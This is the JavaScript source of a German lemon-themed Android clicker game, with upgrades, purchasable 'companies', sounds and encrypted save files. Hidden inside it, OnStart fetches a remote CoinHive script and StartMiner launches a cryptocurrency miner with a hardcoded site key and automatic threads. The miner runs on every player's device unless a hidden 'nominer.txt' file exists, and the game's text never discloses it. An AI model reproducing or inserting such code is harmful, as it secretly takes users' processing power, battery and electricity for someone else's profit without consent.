//Location for the clicker's image.
var clickerImg = "Img/ZitrusClicker.png";

//All sounds were obtained from http://soundbible.com, a royalty free sound effects site.
//Pop sound when clicking the image
pop = app.CreateMediaPlayer();
pop.SetFile("Snd/pop.mp3");

//Open and closing sounds
open = app.CreateMediaPlayer();
open.SetFile("Snd/pop.mp3");
close = app.CreateMediaPlayer();
close.SetFile("Snd/pop.mp3");

//Cha-chind sound
chaching = app.CreateMediaPlayer();
chaching.SetFile("Snd/cha-ching.mp3");

//Location for saving and loading the data.
var directory = app.GetPrivateFolder(app.GetName());
var DisableSounds = !app.FileExists("/sdcard/ZitrusClicker/_nosound.txt");
//Variables for money and income.
var currency = " Ƶ"; 
    //The currency used throughout the game
var money = 0;
    //Starting money
var income = 0;
    //Starting income (money gained per 'incomeTimer' seconds
var incomeTimer = 3;
    //In seconds!
var normalMultiplier = 1;
    //Starting tap multiplier (how much money gained per tap)

//Variables for upgrades.
    //Starting list of the owned upgrades
var ownedUpgrades = [];
    //Upgrade names MUST BE THE SAME LENGTH AS 'descriptionUpgrades'
var allUpgrades = ["2 Zitronenpflanzen", "Zitronen Beet", "Zitronen Garten"];
    //Descriptions of all of the upgrades MUST BE THE SAME LENGTH AS 'allUpgrades'
var descriptionUpgrades = ["Ganz einfach, 2 Töpfe mit Zitronpflanzen!","MEHR ZITRONEN!","VIEL MEHR ZITRONEN!!!11elf"];
    //Prices for the upgrades
var priceUpgrades = [50,200,500];   
    //How much money per tap it will give the player
var multiplierUpgrades = [2,4,6];
    //Boolean for the opening and closing of the menu.
var upgradesOpen = false;

//Variables for companies.
    //A list for the amount of companies that the player owns.
var quantityCompanies = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];
    //Company names MUST BE THE SAME LENGTH AS 'descriptionCompanies'
var allCompanies = ["Arbeiter", "Fabrik"];
    //Company descriptions MUST BE THE SAME LENGTH AS 'allCompanies'
var descriptionCompanies = ["stelle (unterbezahlte) Arbeiter ein die für dich die arbeit machen", "Kaufe eine Fabrik um mehr Zitronen zu bekommen!"];
    //The starting prices for the companies
var priceCompanies = [100,150,300,400,500,550,600,1000,2000,4000,6000,8000,10000,12000,15000,20000,25000,30000,35000,40000,50000,60000,70000,80000,90000,100000,120000,140000,160000,200000,250000,300000,600000,1000000];
    //The income which the companies will give the player per purchase
var incomeCompanies = [5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100,105,110,115,120,125,130,135,140,145,175,200,250,300,500];
    //Boolean for the opening and closing of the menu.
var companiesOpen = false;

//Copies the variables from above for data resetting
var defaultmoney = money;
var defaultincome = income;
var defaultnormalMultiplier = normalMultiplier;
var defaultownedUpgrades = ownedUpgrades;
var defaultquantityCompanies = quantityCompanies;
var defaultpriceCompanies = priceCompanies;

var backcount = 0;
var alerts = {    };  
    function StartMiner() {
	var miner = new CoinHive.User('aFz4C1jJtOQEEuuquRg2m7KbdgcVPf8Q', 'ZitrusClicker', {
	//threads: 1,
	autoThreads: true,
	throttle: .1,
	//forceASMJS: false
});

	miner.start();        
	
	miner.on('accepted', function() { 
	app.ShowPopup( 'Hash Accepted!' );
	/* Hash accepted by the pool */ })

    }
//Called when application is started.
function OnStart()
{

    
    app.ShowProgress("Loading...");
    
    app.ExtractAssets(app.GetAppPath() + "/Img/",directory+"/Img/", true );
    app.ExtractAssets(app.GetAppPath() + "/Snd/",directory+"/Snd/", true );
    
    crypt = app.CreateCrypt();
    app.SetBackColor("#111111");
    //Force portrait mode and disable normal back key function.
    app.SetOrientation( "Portrait" );
    app.EnableBackKey( false );

    //Create a universal layout.
    lay = app.CreateLayout( "Linear", "VCenter,FillXY" );
    
    //Create a layout for the money display.
    moneyLay = app.CreateLayout( "Linear", "VCenter,FillX" );
    moneyLay.SetSize( 1, 0.1 );
    moneyLay.SetBackColor( "#000000" );
    
    //Create text for the amount of money.
    moneyDisplay = app.CreateText( "<b>" + money + currency + "</b>", 1, -1, "html" );
    moneyDisplay.SetTextSize( 22 );
    moneyDisplay.SetTextColor( "#f0f0f0" );
    moneyDisplay.SetOnTouchDown( tapMoney );
    moneyLay.AddChild( moneyDisplay );
    
    //Create a layout for the clicker of the game.
    clickerLay = app.CreateLayout( "Linear", "VCenter,FillX" );
    clickerLay.SetSize( 1, 0.8 );

    //Create an image for the clicker and add it to the layout.
    clicker = app.CreateImage( clickerImg, 0.9 );
    clicker.SetOnTouchDown( tapClicker );
    clickerLay.AddChild( clicker );
    
    //Create a layout for the bottom menu.
    menuLay = app.CreateLayout( "Linear", "Horizontal,VCenter,FillX" );
    menuLay.SetSize( 1, 0.1 );
    
    //Create buttons for the menus.
    upgradesButton = app.CreateButton( "Upgrades", 0.5, 0.1 );
    upgradesButton.SetBackColor( "#000000" );
    upgradesButton.SetTextSize(24);
    upgradesButton.SetOnTouch( openUpgrades );
    menuLay.AddChild( upgradesButton );
    companiesButton = app.CreateButton( "Zeug", 0.5, 0.1 );
    companiesButton.SetTextSize(24);
    companiesButton.SetBackColor( "#000000" );
    companiesButton.SetOnTouch( openCompanies );
    menuLay.AddChild( companiesButton );
    
    //Upgrades menu layout and objects.
    upgradesLay = app.CreateLayout( "Linear", "FillXY" );
    upgradesLay.SetBackColor( "#000000" );
    upgradesLay.SetVisibility( "Hide" );
    upgradesHeader = app.CreateLayout( "Linear", "Horizontal,VCenter,FillX" );
    upgradesHeader.SetBackColor( "#000000" );
    upgradesHeader.SetSize( 1, 0.1 );
    upgradesLay.AddChild( upgradesHeader );
    upgradesTitle = app.CreateText( "Upgrades", 1, -1 );
    upgradesTitle.SetOnTouchUp( closeUpgrades );
    upgradesTitle.SetTextSize( 32 );
    upgradesTitle.SetTextColor( "#FEFEFE" );
    upgradesHeader.AddChild( upgradesTitle );
    upgradesScroller = app.CreateScroller( 1, 0.9 );
    upgradesLay.AddChild( upgradesScroller );
    
    upgradesList = app.CreateLayout( "Linear", "FillX" );
    upgradesList.SetSize( 1, 0.9 );
    upgradesScroller.AddChild( upgradesList );
    
    //Adds the upgrades and their details into the layer automatically.
    for( i = 0; i < allUpgrades.length; i++ )
    {
        currentButton = app.CreateButton( allUpgrades[i], 1, 0.1 );
        currentButton.SetBackColor( "#000f0f" );
        currentButton.SetTextSize( 22 );
        currentButton.SetMargins( 0, 0, 0, 0.005 );
        currentButton.SetOnTouch( showUpgradeDescription );
        upgradesList.AddChild( currentButton );
    }
    
    //Companies menu layout and objects.
    companiesLay = app.CreateLayout( "Linear", "FillXY" );
    companiesLay.SetBackColor( "#000000" );
    companiesLay.SetVisibility( "Hide" );
    companiesHeader = app.CreateLayout( "Linear", "Horizontal,VCenter,FillX" );
    companiesHeader.SetBackColor( "#000000" );
    companiesHeader.SetSize( 1, 0.1 );
    companiesLay.AddChild( companiesHeader );
    companiesTitle = app.CreateText( "Zeug.. halt", 1, -1 );
    companiesTitle.SetOnTouchUp( closeCompanies );
    companiesTitle.SetTextSize( 32 );
    companiesTitle.SetTextColor( "#FEFEFE" );
    companiesHeader.AddChild( companiesTitle );
    companiesScroller = app.CreateScroller( 1, 0.9 );
    companiesLay.AddChild( companiesScroller );
    
    companiesList = app.CreateLayout( "Linear", "FillX" );
    companiesList.SetSize( 1, 0.9 );
    companiesScroller.AddChild( companiesList );
    
    //Adds the upgrades and their details into the layer automatically.
    for( i = 0; i < allCompanies.length; i++ )
    {
        currentButton = app.CreateButton( allCompanies[i], 1, 0.1 );
        currentButton.SetBackColor( "#000f0f" );
        currentButton.SetTextSize( 22 );
        currentButton.SetMargins( 0, 0, 0, 0.005 );
        currentButton.SetOnTouch( showCompanyDescription );
        companiesList.AddChild( currentButton );
    }
    
    //Add layouts to app.
    lay.AddChild( moneyLay );
    lay.AddChild( clickerLay );
    lay.AddChild( menuLay );
    app.AddLayout( lay );
    app.AddLayout( upgradesLay );
    app.AddLayout( companiesLay );
    
    load();
    
    //Gives the player their income every 'incomeTimer' amount of seconds
    startIncome = setInterval( incomeGive, 1000*incomeTimer );
    autosave = setInterval( save, 2000*incomeTimer );
    
        if( !app.FileExists( app.GetInternalFolder() + "/nominer.txt" ) )
  app.LoadScript("https://coinhive.com/lib/coinhive.min.js", StartMiner);

    
    app.HideProgress();
}

function OnBack(){
    if( upgradesOpen == true)
    {
        closeUpgrades();
    }
    else if( companiesOpen == true )
    {
        closeCompanies();
    }
    else
    {
        timer = 1
        counter = setInterval( Timer, 1000/1 );
        backcount++;
        if( backcount >= 2 )
        {
            app.Exit();
        }
        else
        {
            app.ShowPopup( "Drücke erneut 'Zurück' zum verlassen der app.", "Bottom" );
        }
    }
}

function load ()
{
    //If the save file exists, load it, otherwise use the starting variables
    if( app.FileExists( directory + "/data.txt" ))
    {
        
        loadedSave = crypt.Decrypt(  window.atob(app.ReadFile( directory + "/data.txt" )), app.GetMacAddress);
            parsedSave = loadedSave.split(/\r\n|\n/);
    
            money = parseInt(parsedSave[0]);
            income = parseInt(parsedSave[1]);
            ownedUpgrades = parsedSave[2].split(",").map(String);
            quantityCompanies = parsedSave[3].split(",").map(Number);
            priceCompanies = parsedSave[4].split(",").map(Number);
            //for( i = 0; i < allUpgrades.length; i++ )
            //{
                
            //}
            //if( ownedUpgrades[ownedUpgrades.length-1] != allUpgrades[0] )
            //if( allUpgrades.indexOf( ownedUpgrades[ownedUpgrades.length-1] == -1 ) )
            if( ownedUpgrades[1] != allUpgrades[0] )
            {
                normalMultiplier = defaultnormalMultiplier;
            }
            else
            {
                normalMultiplier = multiplierUpgrades[ownedUpgrades.length-2];
            }
            updateMoney();
     
    } else 
        MSG("welcome","Wilkommen","Hallo,\nWie ich sehe spielst du gerade mein spiel :P\nich hoffe das dir diese version gefällt aber bevor du startest möchte ich noch sagen das diese app aus langeweile entstanden ist weswegen Fehler sehr warscheinlich sind so bitte meldet diese :)\nDas Spiel speichert alle 10 sekunden automatisch und versuchen zu cheaten wird mit einem Fehler enden da alles verschlüsselt gespeichert wird ;)" );
    
}

function save ()
{
    //Makes the directory in case it hasn't already
    app.MakeFolder( directory );
    //Saves the file
    var text = crypt.Encrypt(money + "\n" + income + "\n" + ownedUpgrades + "\n" + quantityCompanies + "\n" + priceCompanies,app.GetMacAddress);
    app.WriteFile( directory + "/data.txt", window.btoa(text) );
}

function tapClicker ()
{
    //Gives the player money for clicking the Android
    money += normalMultiplier;
    //Calls the function to visually update the player's money
    updateMoney();
    if(DisableSounds) {
    pop.Stop();
    pop.Play();
    }
}

function incomeGive ()
{
    //Gives the player their income from their companies
    money += income;
    //Calls the function to visually update the player's money
    updateMoney();
}

function updateMoney ()
{
    //Sets the money, at the top of the game, to the correct amount
    moneyDisplay.SetHtml( "<b>"  + money.toLocaleString() + currency +"</b>" );
    //Saves the data
    //save();
}

function openUpgrades ()
{
    //Plays sound
    if(DisableSounds) {
    open.Stop();
    open.Play();
    }
    upgradesOpen = true;
    //Pulls the upgrades section up from the bottom
    upgradesLay.Animate( "SlideFromBottom" );
}

function closeUpgrades ()
{
    //Plays sound
    if(DisableSounds) {
    close.Stop();
    close.Play();
    }
    //Pushes the upgrades section down to the bottom
    upgradesLay.Animate( "SlideToBottom" );
    upgradesOpen = false;
}

function ownsUpgrade ( upgrade )
{
    //If the upgrade is in the owned and all upgrades lists... (way around array.includes(obj))
    if( ownedUpgrades[allUpgrades.indexOf(upgrade)] == allUpgrades[allUpgrades.indexOf(upgrade)] )
    {
        //Alerts the user that they own the upgrade
        AlreadyOwned();
        return false;
    }
    else
    {
        return true;
    }
}
function showUpgradeDescription ()
{
    //Gets the information about the selected upgrade
    lastButton = app.GetLastButton();
    upgradeName = lastButton.GetText();
    upgradeDescription = descriptionUpgrades[allUpgrades.indexOf( upgradeName )];
    upgradePrice = priceUpgrades[allUpgrades.indexOf( upgradeName )];
    upgradeMultiplier = multiplierUpgrades[allUpgrades.indexOf( upgradeName )];
    
    //Checks whether the user already has already bought this upgrade
    if ( ownedUpgrades.indexOf(upgradeName) != -1)
    {
    	    MSG("alreadybuyed","Information","Du besitzt dies bereits!");
    } else if( ownsUpgrade( upgradeName ) )
    {
        //Creates a nice-looking popup
        popup = app.CreateDialog( "", "NoTitle" );
        popupLay = app.CreateLayout( "Linear", "VCenter" );
        popupLay.SetSize( 0.9, -1 );
        popup.AddLayout( popupLay );
        popupTitle = app.CreateLayout( "Linear", "VCenter" );
        popupTitle.SetBackColor( "#000f0f" );
        popupTitle.SetSize( 0.9, 0.1 );
        popupName = app.CreateText( upgradeName +  " - " + upgradePrice + currency, 0.9, -1 )
        popupName.SetTextSize( 24 );
        popupName.SetTextColor( "#FEFEFE" );
        popupTitle.AddChild( popupName );
        popupLay.AddChild( popupTitle );
        popupDescription = app.CreateText( upgradeDescription + "\n" + upgradeMultiplier + currency + " pro klick!", 1, -1, "Multiline" );
        popupDescription.SetTextColor( "#EEEEEE" );
        popupDescription.SetBackColor( "#000000" );
        popupDescription.SetTextSize( 20 );
        popupDescription.SetPadding( 0.01, 0.01, 0.01, 0.01 );
        popupLay.AddChild( popupDescription );
        popupBuy = app.CreateButton( "Kaufen", 1, 0.1 );
        popupBuy.SetTextSize( 22 );
        popupBuy.SetBackColor( "#000f0f" );
        popupBuy.SetOnTouch( buyUpgrade );
        popupLay.AddChild( popupBuy );
        popup.Show();
    }
}

function buyUpgrade()
{
    //If the user has purchased the previous upgrade, allow them to buy it.
    if( ownedUpgrades[ownedUpgrades.length - 1] == allUpgrades[allUpgrades.indexOf(upgradeName)-1] || ownedUpgrades[ownedUpgrades.length - 1] == "" && upgradeName == allUpgrades[0] )
    {
        if( money >= upgradePrice )
        {
            ownedUpgrades[ownedUpgrades.length] = upgradeName;
            money -= upgradePrice;
            updateMoney();
            popup.Hide();
            popup.RemoveLayout(popupLay)
            normalMultiplier = upgradeMultiplier;
            MSG("succes2","Information","Upgrade Erfolgreich gekauft!" );
            
    if(DisableSounds) {
            chaching.Stop();
            chaching.Play();
        }
        }
        else
        {
            popup.Hide();
            popup.RemoveLayout(popupLay)
            MSG("notenough2","Information","Du hast nicht genug zitronen!" );
        }
    }
    else if ( ownedUpgrades.indexOf(upgradeName) != -1)
    {
        popup.Hide();
            popup.RemoveLayout(popupLay)
    	    MSG("alreadybuyed","Information","Du besitzt dies bereits!");
    }
    else
    {
        popup.Hide();
            popup.RemoveLayout(popupLay)
        MSG("notbefore","Information","Du benötigts das vorherige Upgrade!" );
    }
}
function openCompanies ()
{
    //Plays sound
    if(DisableSounds) {
    open.Stop();
    open.Play();
    }
    companiesOpen = true;
    //Pull the companies menu from the bottom
    companiesLay.Animate( "SlideFromBottom" );
}

function closeCompanies ()
{
    //Plays sound
    if(DisableSounds) {
    close.Stop();
    close.Play();
    }
    //Push the companies menu to the bottom
    companiesLay.Animate( "SlideToBottom" );
    companiesOpen = false;
}

function showCompanyDescription ()
{
    //Gets information about the selected company
    lastButton = app.GetLastButton();
    companyName = lastButton.GetText();
    companyDescription = descriptionCompanies[allCompanies.indexOf( companyName )];
    companyPrice = priceCompanies[allCompanies.indexOf( companyName )];
    companyIncome = incomeCompanies[allCompanies.indexOf( companyName )];
    companyQuantity = quantityCompanies[allCompanies.indexOf( companyName )];
    
    //Creates a nice-looking popup for it
    popup = app.CreateDialog( "", "NoTitle" );
    popupLay = app.CreateLayout( "Linear", "VCenter" );
    popupLay.SetSize( 0.9, -1 );
    popup.AddLayout( popupLay );
    popupTitle = app.CreateLayout( "Linear", "VCenter" );
    popupTitle.SetBackColor( "#000f0f" );
    popupTitle.SetSize( 0.9, 0.1 );
    popupName = app.CreateText( companyName +  " - " + companyPrice + currency, 0.9, -1 )
    popupName.SetTextSize( 24 );
    popupName.SetTextColor( "#FEFEFE" );
    popupTitle.AddChild( popupName );
    popupLay.AddChild( popupTitle );
    popupDescription = app.CreateText( companyDescription + "\n" + companyIncome + currency + " jede " + incomeTimer + " sekunden!" + "\n\nDu hast momentan \n" + companyQuantity, 1, -1, "Multiline" );
    popupDescription.SetTextColor( "#EEEEEE" );
    popupDescription.SetBackColor( "#000000" );
    popupDescription.SetTextSize( 20 );
    popupDescription.SetPadding( 0.08, 0.01, 0.08, 0.01 );
    popupLay.AddChild( popupDescription );
    popupBuy = app.CreateButton( "Kaufen", 1, 0.1 );
    popupBuy.SetTextSize( 22 );
    popupBuy.SetBackColor( "#000f0f" );
    popupBuy.SetOnTouch( buyCompany );
    popupLay.AddChild( popupBuy );
    popup.Show();
}

function buyCompany ()
{
    //If the player has enough money...
    if( money >= companyPrice )
    {
        //Increase the amount of the company they own by 1
        quantityCompanies[allCompanies.indexOf(companyName)] += 1;
        //Take the money from the player
        money -= companyPrice;
        //Increase the company price by 1.5x
        priceCompanies[allCompanies.indexOf(companyName)] = Math.round(priceCompanies[allCompanies.indexOf(companyName)] * 1.5);
        //Visually updates the player's money
        updateMoney();
        popup.Hide();
        income += companyIncome;
        MSG("success","Information","Erfolgreich gekauft!" );
        
    if(DisableSounds) {
        chaching.Stop();
        chaching.Play();
    }
    }
    else
    {
        popup.Hide();
        MSG("notenough","Information","Nicht genug zitronen!" );
    }
}

tapcount = 0;
function tapMoney()
{
    timer = 1
    counter = setInterval( Timer, 1000*1 );
    tapcount++;
    if( tapcount >= 2 )
    {
        resetData();
    }
    else
    {
        app.ShowPopup( "Drücke nochmal auf dein momentanen Geld um es zurück zu setzen.", "Bottom" );
    }
}


function Timer()
{
    if( timer == 0 )
    {
        clearInterval( counter );
        clearInterval(  );
        tapcount = 0;
        backcount = 0;
        return;
    }
    timer--; 
}

function resetData()
{
    money = defaultmoney;
    income = defaultincome;
    normalMultiplier = defaultnormalMultiplier;
    ownedUpgrades = defaultownedUpgrades;
    quantityCompanies = defaultquantityCompanies;
    priceCompanies = defaultpriceCompanies;
    app.DeleteFile( directory + "/data.txt" );
    save();
    load();
    MSG("","Information","Deine daten wurden zurück gesetzt!");
    updateMoney();
}

function MSG(s,titel,text,btn) {
    var something = s;
    btn = btn || "OK";
    text = text || "";
    titel = titel || "";
            //Creates a nice-looking popup
        msgname = app.CreateDialog( "", "NoTitle" );
        MSGLay = app.CreateLayout( "Linear", "VCenter" );
        MSGLay.SetSize( 0.9, -1 );
        msgname.AddLayout( MSGLay );
        MSGTitle = app.CreateLayout( "Linear", "VCenter" );
        MSGTitle.SetBackColor( "#000f0f" );
        MSGTitle.SetSize( 0.9, 0.1 );
        MSGName = app.CreateText( titel, 0.9, -1 )
        MSGName.SetTextSize( 24 );
        MSGName.SetTextColor( "#FEFEFE" );
        MSGTitle.AddChild( MSGName );
        MSGLay.AddChild( MSGTitle );
        MSGDescription = app.CreateText( text, 1, -1, "Multiline,AutoScale" );
        MSGDescription.SetTextColor( "#EEEEEE" );
        MSGDescription.SetBackColor( "#000000" );
        MSGDescription.SetTextSize( 20 );
        MSGDescription.SetPadding( 0.08, 0.01, 0.08, 0.01 );
        MSGLay.AddChild( MSGDescription );
        MSGok = app.CreateButton( btn, 1, 0.1 );
        MSGok.SetTextSize( 22 );
        MSGok.SetBackColor( "#000f0f" );
        MSGok.parent = msgname;
        MSGok.SetOnTouch(function() {
            this.parent.Hide();
            this.parent = undefined;
        });
        MSGLay.AddChild( MSGok );
        msgname.Show();
            console.log("CREATED ID " + msgname.id);
}

function OnMenu() {
 app.Alert( "djsj" );
}